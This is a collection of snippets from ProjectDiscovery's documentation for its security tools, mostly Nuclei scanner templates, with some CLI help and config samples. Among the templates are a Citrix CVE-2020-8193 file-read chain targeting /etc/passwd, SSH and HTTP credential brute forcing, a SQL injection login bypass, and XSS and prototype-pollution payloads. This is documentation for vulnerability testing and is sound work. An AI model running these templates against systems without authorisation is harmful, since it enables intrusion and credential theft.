[
  {
    "owner": "projectdiscovery",
    "repo": "docs",
    "content": "TITLE: Cloudlist Provider Configuration YAML\nDESCRIPTION: Complete provider configuration template showing setup for multiple cloud providers including AWS, GCP, Azure, and others with environment variable placeholders\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: do\n  id: xxxx\n  digitalocean_token: $DIGITALOCEAN_TOKEN\n\n- provider: scw\n  scaleway_access_key: $SCALEWAY_ACCESS_KEY\n  scaleway_access_token: $SCALEWAY_ACCESS_TOKEN\n\n- provider: aws\n  id: staging\n  aws_access_key: $AWS_ACCESS_KEY\n  aws_secret_key: $AWS_SECRET_KEY\n  aws_session_token: $AWS_SESSION_TOKEN\n\n- provider: gcp\n  id: logs\n  gcp_service_account_key: '{xxxxxxxxxxxxx}'\n\n- provider: azure\n  id: staging\n  client_id: $AZURE_CLIENT_ID\n  client_secret: $AZURE_CLIENT_SECRET\n  tenant_id: $AZURE_TENANT_ID\n  subscription_id: $AZURE_SUBSCRIPTION_ID\n  use_cli_auth: true\n\n- provider: cloudflare\n  email: $CF_EMAIL\n  api_key: $CF_API_KEY\n  api_token: $CF_API_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Testing Race Conditions with Single POST Request in Nuclei\nDESCRIPTION: This template makes 10 simultaneous POST requests to the /coupons endpoint by utilizing the race_count parameter. It holds the last bytes of all requests and synchronizes the send event to test for race conditions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-race-condition-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: race-condition-testing\n\ninfo:\n  name: Race Condition testing\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        POST /coupons HTTP/1.1\n        Host: {{Hostname}}\n        Pragma: no-cache\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n        Cookie: user_session=42332423342987567896\n\n        promo_code=20OFF        \n\n    race: true\n    race_count: 10\n\n    matchers:\n      - type: status\n        part: header\n        status:\n          - 200\n```\n\n----------------------------------------\n\nTITLE: Prototype Pollution Detection with Nuclei Headless\nDESCRIPTION: This template detects prototype pollution vulnerabilities by injecting test parameters and monitoring for JavaScript object pollution. It adapts code from PPScan project and uses script injection to detect when the prototype chain has been successfully polluted.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: prototype-pollution-check\n\ninfo:\n  name: Prototype Pollution Check\n  author: pdteam\n  severity: medium\n  reference: https://github.com/msrkp/PPScan\n\nheadless:\n  - steps:\n      - action: setheader\n        args:\n          part: response\n          key: Content-Security-Policy\n          value: \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"\n      - action: setheader\n        args:\n          part: response\n          key: X-Frame-Options\n          value: foo\n      - action: setheader\n        args:\n          part: response\n          key: If-None-Match\n          value: foo\n      # Set the hook to override window.data for xss detection\n      - action: script\n        args:\n          hook: true\n          code: |\n            // Hooking code adapted from https://github.com/msrkp/PPScan/blob/main/scripts/content_script.js\n            (function() {window.alerts = [];\n\n            function logger(found) {\n            \twindow.alerts.push(found);\n            }\n\n            function check() {\n                loc = location.href;\n\n                if (loc.indexOf(\"e32a5ec9c99\") >= 0 && loc.search(\"a0def12bce\") == -1) {\n                    setTimeout(function() {\n                        if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\") {\n                            logger(location.href);\n                        }\n                        var url = new URL(location.origin + location.pathname);\n                        url.hash = \"__proto__[a0def12bce]=ddcb362f1d60&__proto__.a0def12bce=ddcb362f1d60&dummy\";\n                        location = url.href;\n                    }, 5 * 1000);\n                } else if (loc.search(\"a0def12bce\") != -1) {\n                    setTimeout(function() {\n                        if (Object.prototype.a0def12bce == \"ddcb362f1d60\") {\n                            logger(location.href);\n                        }\n                        window.close();\n                    }, 5 * 1000);\n                } else {\n                    var url = new URL(loc);\n                    url.searchParams.append(\"__proto__[e32a5ec9c99]\", \"ddcb362f1d60\");\n                    url.searchParams.append(\"__proto__.e32a5ec9c99\", \"ddcb362f1d60\");\n                    location = url.href;\n                }\n            }\n\n            window.onload = function() {\n                if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" ||  Object.prototype.a0def12bce == \"ddcb362f1d60\") {\n                    logger(location.href);\n                } else {\n                    check();\n                }\n            };\n\n            var timerID = setInterval(function() {\n                if (Object.prototype.e32a5ec9c99 == \"ddcb362f1d60\" || Object.prototype.a0def12bce == \"ddcb362f1d60\") {\n                    logger(location.href);\n                    clearInterval(timerID);\n                }\n            }, 5 * 1000)})();\n      - args:\n          url: \"{{BaseURL}}\"\n        action: navigate\n      - action: waitload\n      - action: script\n        name: alerts\n        args:\n          code: \"window.alerts\"\n    matchers:\n      - type: word\n        part: alerts\n        words:\n          - \"__proto__\"\n    extractors:\n      - type: kval\n        part: alerts\n        kval:\n          - alerts\n```\n\n----------------------------------------\n\nTITLE: HTTP Intruder Bruteforcing with Clusterbomb Attack\nDESCRIPTION: Template demonstrating HTTP intruder bruteforcing using raw POST requests with defined username and password payloads. Uses clusterbomb attack type to test all payload combinations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-payloads-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: multiple-raw-example\ninfo:\n  name: Test RAW Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        POST /?username=§username§&paramb=§password§ HTTP/1.1\n        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)\n        Host: {{Hostname}}\n        another_header: {{base64('§password§')}}\n        Accept: */*\n\n        body=test\n\n    payloads:\n      username:\n        - admin\n\n      password:\n        - admin\n        - guest\n        - password\n        - test\n        - 12345\n        - 123456\n\n    attack: clusterbomb\n\n    matchers:\n      - type: word\n        words:\n          - \"Test is test matcher text\"\n```\n\n----------------------------------------\n\nTITLE: SQL Injection Vulnerability Example in HTTP Request/Response Format\nDESCRIPTION: This example demonstrates a SQL injection vulnerability in a login form where an attacker can bypass authentication by injecting SQL code. The request shows the malicious payload in the password field, and the response shows successful authentication bypass, indicating a critical security vulnerability.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/examples/customautomation.mdx#2025-04-12_snippet_0\n\nLANGUAGE: http\nCODE:\n```\nPOST /login HTTP/1.1\nHost: app.hooli.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=' OR '1'='1\n\nHTTP Response:\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1337\nServer: Apache\n\n<html>\n...\n<p>Welcome back, admin</p>\n...\n</html>\n```\n\n----------------------------------------\n\nTITLE: Installing Individual ProjectDiscovery Tools with Go\nDESCRIPTION: Commands to install Subfinder, HTTPx, and Nuclei individually using Go. These tools are used for subdomain enumeration, HTTP probing, and vulnerability scanning respectively.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/quickstart/index.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/subfinder/cmd/subfinder@latest\ngo install -v github.com/projectdiscovery/httpx/cmd/httpx@latest\ngo install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest\n```\n\n----------------------------------------\n\nTITLE: Implementing Value Sharing Between HTTP Requests in Nuclei Templates (YAML)\nDESCRIPTION: This snippet demonstrates a complete Nuclei template that extracts a value from one HTTP request and shares it with subsequent requests using a dynamic extractor. The template maintains session cookies between requests and uses a regex extractor to capture a random key value that's later referenced in subsequent requests using the §randkey§ syntax.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/value-sharing.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: CVE-2020-8193\n\ninfo:\n  name: Citrix unauthenticated LFI\n  author: pdteam\n  severity: high\n  reference: https://github.com/jas502n/CVE-2020-8193\n\nhttp:\n  - raw:\n      - |\n        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1\n        Host: {{Hostname}}\n        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\n        Content-Type: application/xml\n        X-NITRO-USER: xpyZxwy6\n        X-NITRO-PASS: xWXHUJ56\n\n        <appfwprofile><login></login></appfwprofile>\n\n      - |\n        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1\n        Host: {{Hostname}}\n        User-Agent: python-requests/2.24.0\n        Accept: */*\n        Connection: close\n\n      - |\n        GET /menu/neo HTTP/1.1\n        Host: {{Hostname}}\n        User-Agent: python-requests/2.24.0\n        Accept: */*\n        Connection: close\n\n      - |\n        GET /menu/stc HTTP/1.1\n        Host: {{Hostname}}\n        User-Agent: python-requests/2.24.0\n        Accept: */*\n        Connection: close\n\n      - |\n        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1\n        Host: {{Hostname}}\n        User-Agent: python-requests/2.24.0\n        Accept: */*\n        Connection: close\n        Content-Type: application/xml\n        X-NITRO-USER: oY39DXzQ\n        X-NITRO-PASS: ZuU9Y9c1\n        rand_key: §randkey§\n\n        <appfwprofile><login></login></appfwprofile>\n\n      - |\n        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1\n        Host: {{Hostname}}\n        User-Agent: python-requests/2.24.0\n        Accept: */*\n        Connection: close\n        Content-Type: application/xml\n        X-NITRO-USER: oY39DXzQ\n        X-NITRO-PASS: ZuU9Y9c1\n        rand_key: §randkey§\n\n        <clipermission></clipermission>\n\n    cookie-reuse: true # Using cookie-reuse to maintain session between each request, same as browser.\n\n    extractors:\n      - type: regex\n        name: randkey # Variable name\n        part: body\n        internal: true\n        regex:\n          - \"(?m)[0-9]{3,10}\\\\.[0-9]+\"\n\n    matchers:\n      - type: regex\n        regex:\n          - \"root:[x*]:0:0:\"\n        part: body\n```\n\n----------------------------------------\n\nTITLE: Basic HTTP Template in YAML\nDESCRIPTION: A simple template that performs a GET request to the root path and checks for a specific string in the response. It demonstrates the basic structure of a Nuclei HTTP template with a single matcher.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: basic-example\n\ninfo:\n  name: Test HTTP Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}\"\n    matchers:\n      - type: word\n        words:\n          - \"This is test matcher text\"\n```\n\n----------------------------------------\n\nTITLE: Complete Git Config Detection Template in Nuclei\nDESCRIPTION: A full example of a Nuclei template that searches for exposed .git/config files on web servers, including metadata, HTTP request configuration, and response matching.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nid: git-config\n\ninfo:\n  name: Git Config File\n  author: Ice3man\n  severity: medium\n  description: Searches for the pattern /.git/config on passed URLs.\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/.git/config\"\n    matchers:\n      - type: word\n        words:\n          - \"[core]\"\n```\n\n----------------------------------------\n\nTITLE: SSH Password Bruteforce using JavaScript Protocol\nDESCRIPTION: Template showing advanced usage for SSH credential bruteforcing with pre-conditions, clusterbomb attack, and multiple payloads. Includes verification of password authentication support before attempting bruteforce.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/protocol.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: ssh-brute\n\ninfo:\n  name: SSH Credential Stuffing\n  author: tarunKoyalwar\n  severity: critical\n  \n\njavascript:\n  - pre-condition: |\n      var m = require(\"nuclei/ssh\");\n      var c = m.SSHClient();\n      var response = c.ConnectSSHInfoMode(Host, Port);\n      // only bruteforce if ssh server allows password based authentication\n      response[\"UserAuth\"].includes(\"password\")\n\n    code: |\n      var m = require(\"nuclei/ssh\");\n      var c = m.SSHClient();\n      c.Connect(Host,Port,Username,Password);\n\n    args:\n      Host: \"{{Host}}\"\n      Port: \"22\"\n      Username: \"{{usernames}}\"\n      Password: \"{{passwords}}\"\n\n    threads: 10\n    attack: clusterbomb\n    payloads:\n      usernames: helpers/wordlists/wp-users.txt\n      passwords: helpers/wordlists/wp-passwords.txt\n\n    stop-at-first-match: true\n    matchers:\n      - type: dsl\n        dsl:\n          - \"response == true\"\n          - \"success == true\"\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Implementing DNS and HTTP Checks for Subdomain Takeover in Nuclei YAML\nDESCRIPTION: This YAML snippet demonstrates a multi-protocol template in Nuclei v3, combining DNS and HTTP checks for potential subdomain takeovers. It performs a DNS CNAME lookup and an HTTP GET request, then uses matchers to check for specific conditions in both responses.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/multi-protocol.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: dns-http-template\n\ninfo:\n  name: dns + http takeover template\n  author: pdteam\n  severity: info\n\ndns:\n  - name: \"{{FQDN}}\" # dns request\n    type: cname\n\nhttp:\n  - method: GET # http request\n    path:\n      - \"{{BaseURL}}\"\n\n    matchers:\n      - type: dsl\n        dsl:\n          - contains(http_body,'Domain not found') # check for string from http response\n          - contains(dns_cname, 'github.io') # check for cname from dns response\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Creating Basic Raw HTTP POST Request in Nuclei\nDESCRIPTION: Demonstrates the syntax for a basic raw HTTP POST request in a Nuclei template. The example shows how to specify headers and form data while using the {{Hostname}} variable for dynamic targeting.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/raw-http.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nhttp:\n  - raw:\n    - |\n        POST /path2/ HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: application/x-www-form-urlencoded\n\n        a=test&b=pd\n```\n\n----------------------------------------\n\nTITLE: Testing Race Conditions with Multiple Requests in Nuclei\nDESCRIPTION: This template demonstrates race condition testing with multiple different POST requests. It uses the threads parameter set to 5, matching the number of different requests being made, and synchronizes them to test for race conditions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-race-condition-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: race-condition-testing\n\ninfo:\n  name: Race condition testing with multiple requests\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:  \n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=1\n        \n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=2\n\n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=3\n\n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=4\n\n      - |\n        POST / HTTP/1.1\n        Pragma: no-cache\n        Host: {{Hostname}}\n        Cache-Control: no-cache, no-transform\n        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\n\n        id=5\n\n    threads: 5\n    race: true\n\n    matchers:\n      - type: status\n        status:\n          - 200\n```\n\n----------------------------------------\n\nTITLE: Displaying uncover Command-Line Options in Console\nDESCRIPTION: This snippet shows the complete usage guide for the uncover tool, including all available flags for input, search engine selection, configuration, output formatting, and debugging. It details options for querying multiple search engines, setting rate limits, and customizing output fields.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/uncover/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nUsage:\n  ./uncover [flags]\n\nFlags:\nINPUT:\n   -q, -query string[]   search query, supports: stdin,file,config input (example: -q 'example query', -q 'query.txt')\n   -e, -engine string[]  search engine to query (shodan,shodan-idb,fofa,censys,quake,hunter,zoomeye,netlas,criminalip,publicwww,hunterhow) (default shodan)\n   -asq, -awesome-search-queries string[] use awesome search queries to discover exposed assets on the internet (example: -asq 'jira')\n\nSEARCH-ENGINE:\n   -s, -shodan string[]       search query for shodan (example: -shodan 'query.txt')\n   -sd, -shodan-idb string[]  search query for shodan-idb (example: -shodan-idb 'query.txt')\n   -ff, -fofa string[]        search query for fofa (example: -fofa 'query.txt')\n   -cs, -censys string[]      search query for censys (example: -censys 'query.txt')\n   -qk, -quake string[]       search query for quake (example: -quake 'query.txt')\n   -ht, -hunter string[]      search query for hunter (example: -hunter 'query.txt')\n   -ze, -zoomeye string[]     search query for zoomeye (example: -zoomeye 'query.txt')\n   -ne, -netlas string[]      search query for netlas (example: -netlas 'query.txt')\n   -cl, -criminalip string[]  search query for criminalip (example: -criminalip 'query.txt')\n   -pw, -publicwww string[]   search query for publicwww (example: -publicwww 'query.txt')\n   -hh, -hunterhow string[]   search query for hunterhow (example: -hunterhow 'query.txt')\n\nCONFIG:\n   -pc, -provider string         provider configuration file (default \"$CONFIG/uncover/provider-config.yaml\")\n   -config string                flag configuration file (default \"$CONFIG/uncover/config.yaml\")\n   -timeout int                  timeout in seconds (default 30)\n   -rl, -rate-limit int          maximum number of http requests to send per second\n   -rlm, -rate-limit-minute int  maximum number of requests to send per minute\n   -retry int                    number of times to retry a failed request (default 2)\n\nOUTPUT:\n   -o, -output string  output file to write found results\n   -f, -field string   field to display in output (ip,port,host) (default \"ip:port\")\n   -j, -json           write output in JSONL(ines) format\n   -r, -raw            write raw output as received by the remote api\n   -l, -limit int      limit the number of results to return (default 100)\n   -nc, -no-color      disable colors in output\n\nDEBUG:\n   -silent   show only results in output\n   -version  show version of the project\n   -v        show verbose output\n```\n\n----------------------------------------\n\nTITLE: Reading Data from Socket in Nuclei Network Template\nDESCRIPTION: Demonstrates how to read data from the socket by specifying a read-size. This allows for receiving and processing responses from the server.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\ninputs:\n  - read-size: 8\n```\n\n----------------------------------------\n\nTITLE: Installing Nuclei using Go\nDESCRIPTION: This command installs the latest version of Nuclei using Go. It requires the latest version of Go to be installed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\n```\n\n----------------------------------------\n\nTITLE: Multi-protocol Template with DNS, SSL, and HTTP Checks in Nuclei YAML\nDESCRIPTION: This YAML snippet showcases a multi-protocol template in Nuclei v3 that combines DNS, SSL, and HTTP checks. It demonstrates how to use protocol-prefixed variables to access response fields from different protocols within the same template.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/multi-protocol.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: dns-ssl-http-proto-prefix\n\ninfo:\n  name: multi protocol request with response fields\n  author: pdteam\n  severity: info\n\ndns:\n  - name: \"{{FQDN}}\" # DNS Request\n    type: cname\n\nssl:\n  - address: \"{{Hostname}}\" # ssl request\n\nhttp:\n  - method: GET # http request\n    path:\n      - \"{{BaseURL}}\"\n\n    matchers:\n      - type: dsl\n        dsl:\n          - contains(http_body,'ProjectDiscovery.io') # check for http string\n          - trim_suffix(dns_cname,'.ghost.io.') == 'projectdiscovery' # check for cname (extracted information from dns response)\n          - ssl_subject_cn == 'blog.projectdiscovery.io'\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Authenticated HTTP Request Sequence with Cookie Reuse\nDESCRIPTION: Template demonstrating authenticated HTTP requests by maintaining session cookies between subsequent requests. Makes GET and POST requests while preserving session state.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-payloads-examples.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: multiple-raw-example\ninfo:\n  name: Test RAW Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n        Origin: {{BaseURL}}\n\n      - |\n        POST /testing HTTP/1.1\n        Host: {{Hostname}}\n        Origin: {{BaseURL}}\n\n        testing=parameter\n\n    cookie-reuse: true\n    matchers:\n      - type: word\n        words:\n          - \"Test is test matcher text\"\n```\n\n----------------------------------------\n\nTITLE: Basic Race Condition Testing in Nuclei Using YAML\nDESCRIPTION: Example template for simple race condition testing where the same HTTP request is repeated 10 times using Nuclei's Gate mechanism. This configuration sends identical POST requests simultaneously to test for race conditions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/race-conditions.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: race-condition-testing\n\ninfo:\n  name: Race condition testing\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        POST /coupons HTTP/1.1\n        Host: {{Hostname}}\n\n        promo_code=20OFF        \n\n    race: true\n    race_count: 10\n\n    matchers:\n      - type: status\n        part: header\n        status:\n          - 200\n```\n\n----------------------------------------\n\nTITLE: Executing PostgreSQL Query\nDESCRIPTION: Connects to a PostgreSQL database and executes a SQL query. Returns query results in SQLResult format.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/postgres.PGClient.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst postgres = require('nuclei/postgres');\nconst client = new postgres.PGClient;\nconst result = client.ExecuteQuery('acme.com', 5432, 'username', 'password', 'dbname', 'select * from users');\nlog(to_json(result));\n```\n\n----------------------------------------\n\nTITLE: PDTM CLI Command Options and Flags\nDESCRIPTION: Complete list of command-line flags and options for PDTM, organized into categories including configuration, installation, updates, removal and debugging. Shows default values and usage patterns for each option.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/pdtm/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nUsage:\n  ./pdtm [flags]\n\nFlags:\nCONFIG:\n   -config string            cli flag configuration file (default \"$HOME/.config/pdtm/config.yaml\")\n   -bp, -binary-path string  custom location to download project binary (default \"$HOME/.pdtm/go/bin\")\n\nINSTALL:\n   -i, -install string[]  install single or multiple project by name (comma separated)\n   -ia, -install-all      install all the projects\n   -ip, -install-path     append path to PATH environment variables\n\nUPDATE:\n   -u, -update string[]         update single or multiple project by name (comma separated)\n   -ua, -update-all             update all the projects\n   -up, -self-update            update pdtm to latest version\n   -duc, -disable-update-check  disable automatic pdtm update check\n\nREMOVE:\n   -r, -remove string[]  remove single or multiple project by name (comma separated)\n   -ra, -remove-all      remove all the projects\n   -rp, -remove-path     remove path from PATH environment variables\n\nDEBUG:\n   -sp, -show-path          show the current binary path then exit\n   -version                 show version of the project\n   -v, -verbose             show verbose output\n   -nc, -no-color           disable output content coloring (ANSI escape codes)\n   -disable-changelog, -dc  disable release changelog in output\n```\n\n----------------------------------------\n\nTITLE: XSS Detection with Dialog Interception in Nuclei\nDESCRIPTION: This template detects XSS vulnerabilities by injecting a JavaScript payload that triggers an alert dialog. It uses the waitdialog action to capture any triggered alert dialogs, providing verification of successful XSS execution.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless-examples.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nheadless:\n  - steps:\n      - action: navigate\n        args:\n          url: \"{{BaseURL}}/search?text=foo{{url_encode('\\\\\"><script>alert(3+4)</script>')}}\"\n\n      - action: waitdialog\n        name: reflected_text_query\n        args:\n          max-duration: 10s\n\n    matchers:\n      - type: dsl\n        dsl:\n          - reflected_text_query == true\n\n    extractors:\n      - type: dsl\n        dsl:\n          - reflected_text_query_type # Output: \"alert\"\n          - reflected_text_query_message # Output: \"7\"\n```\n\n----------------------------------------\n\nTITLE: DOM XSS Detection by Hooking JavaScript Sinks in Nuclei\nDESCRIPTION: This template detects DOM-based XSS vulnerabilities that utilize window.name as a source. It hooks common JavaScript sinks like eval, innerHTML, and document.write to identify when malicious payload from window.name is executed or rendered on the page.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless-examples.mdx#2025-04-12_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nid: window-name-domxss\n\ninfo:\n  name: window.name DOM XSS\n  author: pdteam\n  severity: medium\n\nheadless:\n  - steps:\n      - action: setheader\n        args:\n          part: response\n          key: Content-Security-Policy\n          value: \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\"\n      - action: script\n        args:\n          hook: true\n          code: |\n            (function() {window.alerts = [];\n\n            function logger(found) {\n            \twindow.alerts.push(found);\n            }\n\n            function getStackTrace () {\n              var stack;\n              try {\n                throw new Error('');\n              }\n              catch (error) {\n                stack = error.stack || '';\n              }\n              stack = stack.split('\\n').map(function (line) { return line.trim(); });\n              return stack.splice(stack[0] == 'Error' ? 2 : 1);\n            }\n            window.name = \"{{randstr_1}}'\\\"<>\";\n\n            var oldEval = eval;\n            var oldDocumentWrite = document.write;\n            var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set;\n            Object.defineProperty(Element.prototype, 'innerHTML', {\n              set: function innerHTML_Setter(val) {\n                if (val.includes(\"{{randstr_1}}'\\\"<>\")) {\n                  logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()});\n                }\n                return setter.call(this, val)\n              }\n            });\n            eval = function(data) {\n              if (data.includes(\"{{randstr_1}}'\\\"<>\")) {\n                logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()});\n              }\n              return oldEval.apply(this, arguments);\n            };\n            document.write = function(data) {\n              if (data.includes(\"{{randstr_1}}'\\\"<>\")) {\n                logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()});\n              }\n              return oldEval.apply(this, arguments);\n            };\n            })();\n      - args:\n          url: \"{{BaseURL}}\"\n        action: navigate\n      - action: waitload\n      - action: script\n        name: alerts\n        args:\n          code: \"window.alerts\"\n    matchers:\n      - type: word\n        part: alerts\n        words:\n          - \"sink:\"\n    extractors:\n      - type: kval\n        part: alerts\n        kval:\n          - alerts\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Business Logic Vulnerability (Negative Cart Balance) in HTTP\nDESCRIPTION: This snippet shows a business logic vulnerability in a shopping cart function. The application fails to validate the quantity parameter, allowing for negative quantities and potentially leading to credit.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/ai.mdx#2025-04-12_snippet_2\n\nLANGUAGE: http\nCODE:\n```\nPOST /add-to-cart HTTP/1.1\nHost: example.com\nUser-Agent: Mozilla/5.0\nContent-Type: application/x-www-form-urlencoded\n\nproduct_id=1001&quantity=-1\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 1337\nServer: Apache\n\n<html>\n...\n<p>Product added to cart. Current balance: -$19.99</p>\n...\n</html>\n```\n\n----------------------------------------\n\nTITLE: Multi-protocol Template with Dynamic Extractor in Nuclei YAML\nDESCRIPTION: This YAML snippet illustrates a multi-protocol template in Nuclei v3 that uses a dynamic extractor to export data from a DNS response and use it in an HTTP check. It demonstrates how extracted values can be shared across different protocols within the same template.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/multi-protocol.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: dns-http-template\n\ninfo:\n  name: dns + http takeover template\n  author: pdteam\n  severity: info\n\ndns:\n  - name: \"{{FQDN}}\" # dns request\n    type: cname\n\n    extractors:\n      - type: dsl\n        name: exported_cname\n        dsl:\n          - cname\n        internal: true\n\nhttp:\n  - method: GET # http request\n    path:\n      - \"{{BaseURL}}\"\n\n    matchers:\n      - type: dsl\n        dsl:\n          - contains(body,'Domain not found') # check for http string\n          - contains(exported_cname, 'github.io') # check for cname (extracted information from dns response)\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Vulnerability Scanning with Nuclei\nDESCRIPTION: Command to scan hosts for vulnerabilities using Nuclei. This tool uses template files to check targets for hundreds of known security issues and saves findings to a text file.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/quickstart/index.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nnuclei -l live_hosts.txt -o findings.txt\n```\n\n----------------------------------------\n\nTITLE: Basic TE.CL HTTP Smuggling Test Template\nDESCRIPTION: YAML template for testing basic TE.CL HTTP smuggling vulnerability by sending malformed POST requests with conflicting Transfer-Encoding and Content-Length headers.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/http-smuggling-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: 